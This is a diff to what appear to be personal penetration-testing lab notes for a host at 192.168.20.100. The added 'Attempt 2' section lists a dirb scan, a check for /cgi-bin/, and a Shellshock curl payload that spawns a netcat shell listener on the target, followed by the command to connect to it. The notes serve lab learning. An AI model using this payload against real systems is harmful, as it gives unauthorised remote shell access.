@@ -24,9 +24,9 @@
 
 ## Things that need to be checked
 
-[ ] The forward slash after login? is it login.php? or just /login/
+[X] The forward slash after login? is it login.php? or just /login/
 
-[ ] Is the cookie security being posted? If so, what is the value?
+[X] Is the cookie security being posted? If so, what is the value?
 
 
 ## Tools for analysis
@@ -34,6 +34,20 @@
 * PostMan to view data being sent.
 
 * Burp Suite to view data being sent through the browswer. If you decide to use this ensure to set the proxy of the browser to loop back IP 127.0.0.1
+
+
+## Attempt 2
+
+* run dirb https://192.168.20.100 this should return results using common.txt wordlist.
+
+* check to see if any /cgi-bin/ sub-directories
+
+* curl -A '() { :; }; usr/bin/nc -l -p 3333 -e /bin/sh' http://192.168.20.100/home
+
+* then run from another terminal nc 192.168.20.100 3333
+
+* ls should show results from reverse shell
+
 
 
 
